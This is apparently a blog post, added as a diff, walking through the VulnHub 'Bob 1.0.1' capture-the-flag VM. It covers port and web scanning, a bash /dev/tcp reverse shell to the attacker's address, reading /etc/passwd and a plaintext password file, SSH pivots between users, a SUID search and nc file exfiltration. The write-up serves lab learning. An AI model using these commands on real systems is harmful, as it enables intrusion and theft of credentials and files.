@@ -1,0 +1,723 @@
+<meta charset="UTF-8">
+<link rel="stylesheet" href="../../../index.css"/>
+<link rel="stylesheet" href="../../../highlight/styles/monokai.min.css"/>
+<script src="../../../highlight/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+
+<h1>/f0c1s/blog/sec/vulnhub/bob</h1>
+
+<p>
+    <a href="../../../index.html">/blog</a>
+    <a href="../../index.html">Security</a>
+    <a href="../index.html">VulnHub</a>
+    <a href="../../../sec/vulnhub/bob-1.0.1/bob-1.0.1.html">+ Bob 1.0.1 - 2021.12.23 Thursday</a>
+</p>
+
+<h1 id="bob-1.0.1">Bob 1.0.1</h1>
+<h2 id="description">Description</h2>
+<blockquote>
+<p>Difficulty: Beginner/Intermediate</p>
+<p>Bob is my first CTF VM that I have ever made so be easy on me if it’s not perfect.</p>
+<p>The Milburg Highschool Server has just been attacked, the IT staff have taken down their windows server and are now setting up a linux server running Debian. Could there a few weak points in the new unfinished server?</p>
+<p>Your Goal is to get the flag in /</p>
+<p>Hints: Remember to look for hidden info/files</p>
+<p>## Changelog v1.0 ~ 2018-03-07 v1.0.1 ~ 2018-03-09</p>
+</blockquote>
+<figure>
+<img src="0.running-box.png" alt="" /><figcaption>0.running-box</figcaption>
+</figure>
+<h2 id="scanning">Scanning</h2>
+<pre class="shell"><code>hostname -I: 192.168.42.7 192.168.56.70 
+Thursday 23 December 2021 12:22:40 AM IST 2021.12.23 00:22:40
+f0c1s@kali:~/vuln-hubs/bob-1.0.1 $
+fping -aAqg 192.168.56.1/24
+192.168.56.1
+192.168.56.2
+192.168.56.70
+192.168.56.78
+                                                                                                                                                                                                                                           
+
+
+hostname -I: 192.168.42.7 192.168.56.70 
+Thursday 23 December 2021 12:22:54 AM IST 2021.12.23 00:22:54
+f0c1s@kali:~/vuln-hubs/bob-1.0.1 $
+export RHOST=&quot;192.168.56.78&quot;
+export LHOST=&quot;192.168.56.70&quot;
+export LPORT=&quot;443&quot;
+                                                                                                                                                                                                                                           
+
+
+hostname -I: 192.168.42.7 192.168.56.70 
+Thursday 23 December 2021 12:22:58 AM IST 2021.12.23 00:22:58
+f0c1s@kali:~/vuln-hubs/bob-1.0.1 $
+_n $RHOST 
+firing nmap 192.168.56.78 | tee nmap.default.txt
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-23 00:23 IST
+Nmap scan report for 192.168.56.78
+Host is up (0.00017s latency).
+Not shown: 999 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
+                                                                                                                                                                                                                                           
+
+
+hostname -I: 192.168.42.7 192.168.56.70 
+Thursday 23 December 2021 12:23:05 AM IST 2021.12.23 00:23:05
+f0c1s@kali:~/vuln-hubs/bob-1.0.1 $
+_ntd $RHOST
+firing nmap 192.168.56.78 -p- -Pn -A -T4 --min-rate=5000 -sVC | tee nmap.tcp-ports.deep.txt
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-23 00:23 IST
+Nmap scan report for 192.168.56.78
+Host is up (0.00019s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT      STATE SERVICE VERSION
+80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
+| http-robots.txt: 4 disallowed entries 
+| /login.php /dev_shell.php /lat_memo.html 
+|_/passwords.html
+|_http-title: Site doesn&#39;t have a title (text/html).
+|_http-server-header: Apache/2.4.25 (Debian)
+25468/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 84:f2:f8:e5:ed:3e:14:f3:93:d4:1e:4c:41:3b:a2:a9 (RSA)
+|   256 5b:98:c7:4f:84:6e:fd:56:6a:35:16:83:aa:9c:ea:f8 (ECDSA)
+|_  256 39:16:56:fb:4e:0f:50:85:40:d3:53:22:41:43:38:15 (ED25519)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.25 seconds
+                                                                                                                                                                                                                                           
+
+
+hostname -I: 192.168.42.7 192.168.56.70 
+Thursday 23 December 2021 12:23:17 AM IST 2021.12.23 00:23:17
+f0c1s@kali:~/vuln-hubs/bob-1.0.1 $
+sudo nmap $RHOST -n -p- -Pn -T4 --min-rate=5000 --top-ports=100 -sU --open | tee nmap.udp.top-100.txt                            
+[sudo] password for f0c1s: 
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-23 00:23 IST
+Nmap scan report for 192.168.56.78
+Host is up (0.00045s latency).
+All 100 scanned ports on 192.168.56.78 are in ignored states.
+Not shown: 95 open|filtered udp ports (no-response), 5 closed udp ports (port-unreach)
+MAC Address: 08:00:27:87:A9:21 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.72 seconds</code></pre>
+<p>Two ports, both are TCP, 80 and 24568, reported web and ssh, respectively.</p>
+<h2 id="attacking-web">Attacking Web</h2>
+<pre class="shell"><code>hostname -I: 192.168.42.7 192.168.56.70 
+Thursday 23 December 2021 12:25:25 AM IST 2021.12.23 00:25:25
+f0c1s@kali:~/vuln-hubs/bob-1.0.1 $
+dirb http://$RHOST -o dirb.txt   
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+OUTPUT_FILE: dirb.txt
+START_TIME: Thu Dec 23 00:25:29 2021
+URL_BASE: http://192.168.56.78/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://192.168.56.78/ ----
++ http://192.168.56.78/index.html (CODE:200|SIZE:1425)                                                            
++ http://192.168.56.78/robots.txt (CODE:200|SIZE:111)                                                             
++ http://192.168.56.78/server-status (CODE:403|SIZE:301)                                                          
+                                                                                                                  
+-----------------
+END_TIME: Thu Dec 23 00:25:30 2021
+DOWNLOADED: 4612 - FOUND: 3
+</code></pre>
+<pre class="shell"><code>hostname -I: 192.168.42.7 192.168.56.70 
+Thursday 23 December 2021 12:25:30 AM IST 2021.12.23 00:25:30
+f0c1s@kali:~/vuln-hubs/bob-1.0.1 $
+curl -s -I http://$RHOST/robots.txt | tee curl.-sI-robots.txt
+HTTP/1.1 200 OK
+Date: Wed, 22 Dec 2021 18:55:39 GMT
+Server: Apache/2.4.25 (Debian)
+Last-Modified: Sun, 04 Mar 2018 19:09:32 GMT
+ETag: &quot;6f-5669af30ee8f1&quot;
+Accept-Ranges: bytes
+Content-Length: 111
+Vary: Accept-Encoding
+Content-Type: text/plain</code></pre>
+<pre class="shell"><code>hostname -I: 192.168.42.7 192.168.56.70 
+Thursday 23 December 2021 12:25:39 AM IST 2021.12.23 00:25:39
+f0c1s@kali:~/vuln-hubs/bob-1.0.1 $
+curl -s http://$RHOST/robots.txt | html2text | tee curl.html2text.robots.txt
+User-agent: * Disallow: /login.php Disallow: /dev_shell.php Disallow: /
+lat_memo.html Disallow: /passwords.html</code></pre>
+<pre class="shell"><code>hostname -I: 192.168.42.7 192.168.56.70 
+Thursday 23 December 2021 12:23:48 AM IST 2021.12.23 00:23:48
+f0c1s@kali:~/vuln-hubs/bob-1.0.1 $
+nikto -C all -host http://$RHOST | tee nikto.txt
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.56.78
++ Target Hostname:    192.168.56.78
++ Target Port:        80
++ Start Time:         2021-12-23 00:25:18 (GMT5.5)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.25 (Debian)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Entry &#39;/dev_shell.php&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry &#39;/lat_memo.html&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry &#39;/passwords.html&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Apache/2.4.25 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Server may leak inodes via ETags, header found with file /, inode: 591, size: 5669af30ee8f1, mtime: gzip
++ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS 
++ OSVDB-3233: /icons/README: Apache default file found.
++ /login.html: Admin login page/section found.
++ 26526 requests: 0 error(s) and 11 item(s) reported on remote host
++ End Time:           2021-12-23 00:26:34 (GMT5.5) (76 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested</code></pre>
+<pre class="shell"><code>hostname -I: 192.168.42.7 192.168.56.70 
+Thursday 23 December 2021 12:26:34 AM IST 2021.12.23 00:26:34
+f0c1s@kali:~/vuln-hubs/bob-1.0.1 $
+gobuster dir --url http://$RHOST -x cgi,txt,php --wordlist /usr/share/wordlists/dirbuster/directories.jbrofuzz -b 404,403 -q
+/.                    (Status: 200) [Size: 1425]
+/??                   (Status: 200) [Size: 1425]
+/??.cgi               (Status: 200) [Size: 1425]
+/??.txt               (Status: 200) [Size: 1425]
+/??.php               (Status: 200) [Size: 1425]
+/robots.txt           (Status: 200) [Size: 111] 
+                                                                                                                   
+
+
+hostname -I: 192.168.42.7 192.168.56.70 
+Thursday 23 December 2021 12:27:47 AM IST 2021.12.23 00:27:47
+f0c1s@kali:~/vuln-hubs/bob-1.0.1 $
+gobuster dir --url http://$RHOST -x cgi,txt,php --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt -b 404,403 -q
+/index.html           (Status: 200) [Size: 1425]
+/robots.txt           (Status: 200) [Size: 111] 
+/robots.txt           (Status: 200) [Size: 111]</code></pre>
+<h3 id="browsing-web">Browsing web</h3>
+<figure>
+<img src="1.homepage.png" alt="" /><figcaption>1.homepage</figcaption>
+</figure>
+<p>Source code doesn’t have anything interesting.</p>
+<p>Login link takes us to <code>http://192.168.56.78/login.html</code>.</p>
+<figure>
+<img src="2.disabled-login.png" alt="" /><figcaption>2.disabled-login</figcaption>
+</figure>
+<p>And as per robots, login.php is disallowed, but is not found.</p>
+<h4 id="http192.168.56.78login.php"><code>http://192.168.56.78/login.php</code></h4>
+<figure>
+<img src="3.login-php-not-found.png" alt="" /><figcaption>3.login-php-not-found</figcaption>
+</figure>
+<h4 id="http192.168.56.78news.html"><code>http://192.168.56.78/news.html</code></h4>
+<figure>
+<img src="4.news-page.png" alt="" /><figcaption>4.news-page</figcaption>
+</figure>
+<h4 id="http192.168.56.78about.html"><code>http://192.168.56.78/about.html</code></h4>
+<figure>
+<img src="5.about-page.png" alt="" /><figcaption>5.about-page</figcaption>
+</figure>
+<h3 id="intuition">Intuition</h3>
+<p>I have this inkling that I should cewl the site.</p>
+<pre class="shell"><code>hostname -I: 192.168.42.7 192.168.56.70 
+Thursday 23 December 2021 12:30:50 AM IST 2021.12.23 00:30:50
+f0c1s@kali:~/vuln-hubs/bob-1.0.1 $
+cewl http://$RHOST --with-numbers -d 4 -e &gt;&gt; cewl.txt      
+                                                                                                                   
+
+
+hostname -I: 192.168.42.7 192.168.56.70 
+Thursday 23 December 2021 12:35:14 AM IST 2021.12.23 00:35:14
+f0c1s@kali:~/vuln-hubs/bob-1.0.1 $
+wc cewl.txt       
+ 277  284 2172 cewl.txt</code></pre>
+<h3 id="webshell-at-http192.168.56.78dev_shell.php">webshell at <code>http://192.168.56.78/dev_shell.php</code></h3>
+<figure>
+<img src="6.webshell.png" alt="" /><figcaption>6.webshell</figcaption>
+</figure>
+<h3 id="robots.txt">robots.txt</h3>
+<p>I forgot to take a screenshot earlier.</p>
+<figure>
+<img src="7.robots-txt.png" alt="" /><figcaption>7.robots-txt</figcaption>
+</figure>
+<h3 id="memo-at-http192.168.56.78lat_memo.html">memo at <code>http://192.168.56.78/lat_memo.html</code></h3>
+<figure>
+<img src="8.memo.png" alt="" /><figcaption>8.memo</figcaption>
+</figure>
+<h3 id="passwords-strategy-at-view-sourcehttp192.168.56.78passwords.html">passwords strategy at <code>view-source:http://192.168.56.78/passwords.html</code></h3>
+<figure>
+<img src="9.passwords.png" alt="" /><figcaption>9.passwords</figcaption>
+</figure>
+<h2 id="reverse-shell">Reverse Shell</h2>
+<p>This was waiting to happen.</p>
+<pre class="shell"><code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.56.70/443 0&gt;&amp;1&#39;</code></pre>
+<figure>
+<img src="10.reverse-shell.png" alt="" /><figcaption>10.reverse-shell</figcaption>
+</figure>
+<pre class="shell"><code>www-data@Milburg-High:/var/www/html$ ls -la
+ls -la
+total 1572
+drwxr-xr-x 2 root root    4096 Mar  8  2018 .
+drwxr-xr-x 3 root root    4096 Feb 28  2018 ..
+-rw-r--r-- 1 root root      84 Mar  5  2018 .hint
+-rw-r--r-- 1 root root  340400 Mar  4  2018 WIP.jpg
+-rw-r--r-- 1 root root    2579 Mar  8  2018 about.html
+-rw-r--r-- 1 root root    3145 Mar  4  2018 contact.html
+-rw-r--r-- 1 root root    1396 Mar  4  2018 dev_shell.php
+-rw-r--r-- 1 root root    1361 Mar  4  2018 dev_shell.php.bak
+-rw-r--r-- 1 root root 1177950 Mar  4  2018 dev_shell_back.png
+-rw-r--r-- 1 root root    1425 Mar  4  2018 index.html
+-rw-r--r-- 1 root root    1425 Mar  4  2018 index.html.bak
+-rw-r--r-- 1 root root    1925 Mar  4  2018 lat_memo.html
+-rw-r--r-- 1 root root    1560 Mar  4  2018 login.html
+-rw-r--r-- 1 root root    4086 Mar  4  2018 news.html
+-rw-r--r-- 1 root root     673 Mar  8  2018 passwords.html
+-rw-r--r-- 1 root root     111 Mar  4  2018 robots.txt
+-rw-r--r-- 1 root root   26357 Mar  4  2018 school_badge.png
+www-data@Milburg-High:/var/www/html$ cat .hint
+cat .hint
+Have you tried spawning a tty shell?
+Also don&#39;t forget to check for hidden files ;)
+www-data@Milburg-High:/var/www/html$</code></pre>
+<h3 id="etcpasswd">/etc/passwd</h3>
+<pre class="shell"><code>www-data@Milburg-High:/var/www/html$ cat /etc/passwd
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+_apt:x:104:65534::/nonexistent:/bin/false
+Debian-exim:x:105:109::/var/spool/exim4:/bin/false
+rtkit:x:106:110:RealtimeKit,,,:/proc:/bin/false
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+avahi-autoipd:x:108:111:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
+messagebus:x:109:112::/var/run/dbus:/bin/false
+usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
+speech-dispatcher:x:111:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
+lightdm:x:112:116:Light Display Manager:/var/lib/lightdm:/bin/false
+pulse:x:113:117:PulseAudio daemon,,,:/var/run/pulse:/bin/false
+avahi:x:114:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+saned:x:115:121::/var/lib/saned:/bin/false
+c0rruptedb1t:x:1000:1000:c0rruptedb1t,,,:/home/c0rruptedb1t:/bin/bash
+bob:x:1001:1001:Bob,,,,Not the smartest person:/home/bob:/bin/bash
+jc:x:1002:1002:James C,,,:/home/jc:/bin/bash
+seb:x:1003:1003:Sebastian W,,,:/home/seb:/bin/bash
+elliot:x:1004:1004:Elliot A,,,:/home/elliot:/bin/bash
+sshd:x:116:65534::/run/sshd:/usr/sbin/nologin
+proftpd:x:117:65534::/run/proftpd:/bin/false
+ftp:x:118:65534::/srv/ftp:/bin/false</code></pre>
+<p>There are a bunch of users here.</p>
+<pre class="shell"><code>www-data@Milburg-High:/var/www/html$ cat /etc/passwd | grep -i &quot;/home&quot; | cut -d&#39;:&#39; -f1
+&lt;$ cat /etc/passwd | grep -i &quot;/home&quot; | cut -d&#39;:&#39; -f1
+c0rruptedb1t
+bob
+jc
+seb
+elliot</code></pre>
+<pre class="shell"><code>www-data@Milburg-High:/var/www/html$ ls -la /home
+ls -la /home
+total 24
+drwxr-xr-x  6 root   root   4096 Mar  4  2018 .
+drwxr-xr-x 22 root   root   4096 Mar  5  2018 ..
+drwxr-xr-x 18 bob    bob    4096 Mar  8  2018 bob
+drwxr-xr-x 15 elliot elliot 4096 Feb 27  2018 elliot
+drwxr-xr-x 15 jc     jc     4096 Feb 27  2018 jc
+drwxr-xr-x 15 seb    seb    4096 Mar  5  2018 seb</code></pre>
+<figure>
+<img src="11.users-and-homes-confirmed.png" alt="" /><figcaption>11.users-and-homes-confirmed</figcaption>
+</figure>
+<h3 id="upgrade-shell">upgrade shell</h3>
+<pre class="shell"><code>www-data@Milburg-High:/var/www/html$ python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
+&lt;tml$ python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
+www-data@Milburg-High:/var/www/html$ sudo -l
+sudo -l
+sudo: unable to resolve host Milburg-High: Connection refused
+Matching Defaults entries for www-data on Milburg-High:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on Milburg-High:
+    (ALL) NOPASSWD: /usr/bin/service apache2 *
+    (root) NOPASSWD: /bin/systemctl start ssh</code></pre>
+<p>Wait, I can restart apache2? What about re-running it as a different user?</p>
+<h3 id="checking-users-groups">Checking users’ groups</h3>
+<pre class="shell"><code>www-data@Milburg-High:/var/www/html$ cat /etc/passwd | grep -i &quot;/home&quot; | cut -d&#39;:&#39; -f1 | xargs -I&#39;{}&#39; groups {}
+&lt;-i &quot;/home&quot; | cut -d&#39;:&#39; -f1 | xargs -I&#39;{}&#39; groups {}
+c0rruptedb1t : c0rruptedb1t cdrom floppy sudo audio dip video plugdev netdev bluetooth lpadmin scanner
+bob : bob sudo
+jc : jc users
+seb : seb users
+elliot : elliot users</code></pre>
+<figure>
+<img src="12.checking-permissions-of-users.png" alt="" /><figcaption>12.checking-permissions-of-users</figcaption>
+</figure>
+<h3 id="collecting-info-about-user-bob">Collecting info about user bob</h3>
+<figure>
+<img src="13.bobs-directory.png" alt="" /><figcaption>13.bobs-directory</figcaption>
+</figure>
+<pre class="shell"><code>www-data@Milburg-High:/home$ cat /home/bob/Documents/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here/notes.sh
+_Lookie_In_Here/notes.shSecret/Keep_Out/Not_Porn/No_
+#!/bin/bash
+clear
+echo &quot;-= Notes =-&quot;
+echo &quot;Harry Potter is my faviorite&quot;
+echo &quot;Are you the real me?&quot;
+echo &quot;Right, I&#39;m ordering pizza this is going nowhere&quot;
+echo &quot;People just don&#39;t get me&quot;
+echo &quot;Ohhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh &lt;sea santy here&gt;&quot;
+echo &quot;Cucumber&quot;
+echo &quot;Rest now your eyes are sleepy&quot;
+echo &quot;Are you gonna stop reading this yet?&quot;
+echo &quot;Time to fix the server&quot;
+echo &quot;Everyone is annoying&quot;
+echo &quot;Sticky notes gotta buy em&quot;
+www-data@Milburg-High:/home$ 
+</code></pre>
+<pre class="shell"><code>www-data@Milburg-High:/home$ cd bob
+cd bob
+www-data@Milburg-High:/home/bob$ ls -la
+ls -la
+total 172
+drwxr-xr-x 18 bob  bob   4096 Mar  8  2018 .
+drwxr-xr-x  6 root root  4096 Mar  4  2018 ..
+-rw-------  1 bob  bob   1980 Mar  8  2018 .ICEauthority
+-rw-------  1 bob  bob    214 Mar  8  2018 .Xauthority
+-rw-------  1 bob  bob   6403 Mar  8  2018 .bash_history
+-rw-r--r--  1 bob  bob    220 Feb 21  2018 .bash_logout
+-rw-r--r--  1 bob  bob   3548 Mar  5  2018 .bashrc
+drwxr-xr-x  7 bob  bob   4096 Feb 21  2018 .cache
+drwx------  8 bob  bob   4096 Feb 27  2018 .config
+-rw-r--r--  1 bob  bob     55 Feb 21  2018 .dmrc
+drwxr-xr-x  2 bob  bob   4096 Feb 21  2018 .ftp
+drwx------  3 bob  bob   4096 Mar  5  2018 .gnupg
+drwxr-xr-x  3 bob  bob   4096 Feb 21  2018 .local
+drwx------  4 bob  bob   4096 Feb 21  2018 .mozilla
+drwxr-xr-x  2 bob  bob   4096 Mar  4  2018 .nano
+-rw-r--r--  1 bob  bob     72 Mar  5  2018 .old_passwordfile.html
+-rw-r--r--  1 bob  bob    675 Feb 21  2018 .profile
+drwx------  2 bob  bob   4096 Mar  5  2018 .vnc
+-rw-r--r--  1 bob  bob  25211 Mar  8  2018 .xfce4-session.verbose-log
+-rw-r--r--  1 bob  bob  27563 Mar  7  2018 .xfce4-session.verbose-log.last
+-rw-------  1 bob  bob   3672 Mar  8  2018 .xsession-errors
+-rw-------  1 bob  bob   2866 Mar  7  2018 .xsession-errors.old
+drwxr-xr-x  2 bob  bob   4096 Feb 21  2018 Desktop
+drwxr-xr-x  3 bob  bob   4096 Mar  5  2018 Documents
+drwxr-xr-x  3 bob  bob   4096 Mar  8  2018 Downloads
+drwxr-xr-x  2 bob  bob   4096 Feb 21  2018 Music
+drwxr-xr-x  2 bob  bob   4096 Feb 21  2018 Pictures
+drwxr-xr-x  2 bob  bob   4096 Feb 21  2018 Public
+drwxr-xr-x  2 bob  bob   4096 Feb 21  2018 Templates
+drwxr-xr-x  2 bob  bob   4096 Feb 21  2018 Videos
+www-data@Milburg-High:/home/bob$ 
+
+www-data@Milburg-High:/home/bob$ cat .old_passwordfile.html
+cat .old_passwordfile.html
+&lt;html&gt;
+&lt;p&gt;
+jc:Qwerty
+seb:`T1tanium_Pa$$word_Hack3rs_Fear_M3`
+&lt;/p&gt;
+&lt;/html&gt;
+www-data@Milburg-High:/home/bob$</code></pre>
+<p>Credentials:</p>
+<ul>
+<li>jc:Qwerty</li>
+<li>seb:T1tanium_Pa$$word_Hack3rs_Fear_M3</li>
+</ul>
+<h2 id="ssh-as-jc">SSH as jc</h2>
+<figure>
+<img src="14.ssh-as-jc.png" alt="" /><figcaption>14.ssh-as-jc</figcaption>
+</figure>
+<p>And also, as jc we cannot write to apache configuration file.</p>
+<h2 id="ssh-as-seb">SSH as seb</h2>
+<figure>
+<img src="15.ssh-as-seb.png" alt="" /><figcaption>15.ssh-as-seb</figcaption>
+</figure>
+<h3 id="find-suid-and-sgid-binaries">find SUID and SGID binaries</h3>
+<pre class="shell"><code>seb@Milburg-High:/home/bob$ find / -type f -perm -2000 -exec ls -la &quot;{}&quot; \; 2&gt;/dev/null
+-rwxr-sr-x 1 root utmp 10232 Feb 18  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
+-rwsr-sr-x 1 root root 10576 Oct 14  2017 /usr/lib/xorg/Xorg.wrap
+-rwxr-sr-x 1 root shadow 22808 May 17  2017 /usr/bin/expiry
+-rwxr-sr-x 1 root utmp 457608 May 22  2017 /usr/bin/screen
+-rwxr-sr-x 1 root mail 19008 Jan 17  2017 /usr/bin/dotlockfile
+-rwxr-sr-x 1 root shadow 71856 May 17  2017 /usr/bin/chage
+-rwxr-sr-x 1 root crontab 40264 May  3  2015 /usr/bin/crontab
+-rwxr-sr-x 1 root ssh 358624 Nov 18  2017 /usr/bin/ssh-agent
+-rwxr-sr-x 1 root tty 27448 Mar 22  2017 /usr/bin/wall
+-rwxr-sr-x 1 root mail 10952 Dec 24  2016 /usr/bin/dotlock.mailutils
+-rwxr-sr-x 1 root tty 14768 Apr 12  2017 /usr/bin/bsd-write
+-rwxr-sr-x 1 root shadow 35592 May 27  2017 /sbin/unix_chkpwd
+seb@Milburg-High:/home/bob$ find / -type f -perm -4000 -exec ls -la &quot;{}&quot; \; 2&gt;/dev/null
+-rwsr-xr-- 1 root messagebus 42992 Oct  1  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 14856 May 24  2017 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-sr-x 1 root root 10576 Oct 14  2017 /usr/lib/xorg/Xorg.wrap
+-rwsr-xr-x 1 root root 440728 Nov 18  2017 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 1019656 Feb 10  2018 /usr/sbin/exim4
+-rwsr-xr-- 1 root dip 365960 Nov 11  2016 /usr/sbin/pppd
+-rwsr-xr-x 1 root root 40312 May 17  2017 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 75792 May 17  2017 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 59680 May 17  2017 /usr/bin/passwd
+-rwsr-xr-x 1 root root 140944 Jun  5  2017 /usr/bin/sudo
+-rwsr-xr-x 1 root root 23352 May 24  2017 /usr/bin/pkexec
+-rwsr-xr-x 1 root root 50040 May 17  2017 /usr/bin/chfn
+-rwsr-xr-x 1 root root 40504 May 17  2017 /usr/bin/chsh
+-rwsr-xr-x 1 root root 40536 May 17  2017 /bin/su
+-rwsr-xr-x 1 root root 61240 Nov 10  2016 /bin/ping
+-rwsr-xr-x 1 root root 31720 Mar 22  2017 /bin/umount
+-rwsr-xr-x 1 root root 44304 Mar 22  2017 /bin/mount
+-rwsr-xr-x 1 root root 146128 Feb 26  2017 /bin/ntfs-3g
+-rwsr-xr-x 1 root root 30800 Jun 23  2016 /bin/fusermount
+
+
+seb@Milburg-High:/home/bob$ sudo -l
+sudo: unable to resolve host Milburg-High: Connection refused
+Matching Defaults entries for seb on Milburg-High:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User seb may run the following commands on Milburg-High:
+    (ALL) NOPASSWD: /usr/bin/service apache2 *
+    (root) NOPASSWD: /bin/systemctl start ssh
+</code></pre>
+<h2 id="elliots-theadminisdumb.txt">Elliots’ theadminisdumb.txt</h2>
+<pre><code>The admin is dumb,
+In fact everyone in the IT dept is pretty bad but I can’t blame all of them the newbies Sebastian and James are quite new to managing a server so I can forgive them for that password file they made on the server. But the admin now he’s quite something. Thinks he knows more than everyone else in the dept, he always yells at Sebastian and James now they do some dumb stuff but their new and this is just a high-school server who cares, the only people that would try and hack into this are script kiddies. His wallpaper policy also is redundant, why do we need custom wallpapers that doesn’t do anything. I have been suggesting time and time again to Bob ways we could improve the security since he “cares” about it so much but he just yells at me and says I don’t know what i’m doing. Sebastian has noticed and I gave him some tips on better securing his account, I can’t say the same for his friend James who doesn’t care and made his password: Qwerty. To be honest James isn’t the worst bob is his stupid web shell has issues and I keep telling him what he needs to patch but he doesn’t care about what I have to say. it’s only a matter of time before it’s broken into so because of this I have changed my password to
+
+theadminisdumb
+
+I hope bob is fired after the future second breach because of his incompetence. I almost want to fix it myself but at the same time it doesn’t affect me if they get breached, I get paid, he gets fired it’s a good time.</code></pre>
+<figure>
+<img src="16.theadminisdumb-txt.png" alt="" /><figcaption>16.theadminisdumb-txt</figcaption>
+</figure>
+<h2 id="becoming-elliot">Becoming elliot</h2>
+<figure>
+<img src="17.becoming-elliot.png" alt="" /><figcaption>17.becoming-elliot</figcaption>
+</figure>
+<p>How does this help me?</p>
+<pre class="shell"><code>elliot@Milburg-High:~/Downloads$ ls -lAh
+total 5.2M
+-rw-r--r-- 1 elliot elliot 5.2M Feb 27  2018 windows_xp_bliss_wallpaper_3840x2160_by_mrschlendermann-d95w7pd.jpg
+</code></pre>
+<h2 id="getting-downloads-wallpapers-out">Getting Downloads wallpapers out</h2>
+<pre class="shell"><code>sudo nc -nlvp $LPORT -s $LHOST &gt; jc-wallpaper.jpg 
+sudo nc -nlvp $LPORT -s $LHOST &gt; seb-wallpaper.png
+sudo nc -nlvp $LPORT -s $LHOST &gt; elliot-wallpaper.jpg</code></pre>
+<pre class="shell"><code>jc@Milburg-High:~/Downloads$ nc 192.168.56.70 443 &lt; thumb-1920-784277.jpg
+seb@Milburg-High:~/Downloads$ nc 192.168.56.70 443 &lt; GWUvFch.png
+elliot@Milburg-High:~/Downloads$ nc 192.168.56.70 443 &lt; windows_xp_bliss_wallpaper_3840x2160_by_mrschlendermann-d95w7pd.jpg</code></pre>
+<p>I do not understand these wallpapers.</p>
+<h2 id="hidden-in-plain-sight.">Hidden in plain sight.</h2>
+<figure>
